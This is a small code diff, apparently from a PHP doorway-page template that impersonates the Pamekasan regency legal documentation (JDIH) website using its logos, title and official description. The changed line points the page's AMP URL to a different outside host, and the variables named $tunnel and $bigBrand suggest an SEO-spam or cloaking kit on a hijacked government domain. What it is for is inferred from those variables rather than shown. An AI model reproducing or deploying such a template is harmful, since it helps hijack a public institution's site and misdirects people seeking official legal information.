@@ -35,7 +35,7 @@ $baseFavIcon = "https://jdih.pamekasankab.go.id/wp-content/uploads/2024/06/cropp
 $baseLogo = "https://jdih.pamekasankab.go.id/wp-content/uploads/elementor/thumbs/lg-pamekasan-qpvldcrub4oa8bhzosgct7bztw6c6cylp85n1eovh8.png";
 $baseImages = "https://jdih.pamekasankab.go.id/wp-content/uploads/2024/06/cropped-lg-pamekasan-192x192.png";
 $baseURL = "https://jdih.pamekasankab.go.id/?$tunnel=".str_replace(" ","%20",$smallBrand);
-$ampURL = "https://shintaeyong.xyz/luwak/?id_ID=".str_replace(" ","%20",$bigBrand);
+$ampURL = "https://daftar-jdihdokum.pages.dev/?id_ID=".str_replace(" ","%20",$bigBrand);
 $baseTitle = "$bigBrand Beranda JDIH Kabupaten Pamekasan";
 $baseDesc = "Selamat datang di website pemerintah kabupaten pamekasan, yang di kembangkan oleh bagian hukum sekretariat daerah kabupaten pamekasan untuk memuat produk hukum daerah pamekasan.";
 $baseRefURL = "https://mptvadakara.ihrd.ac.in/"; 
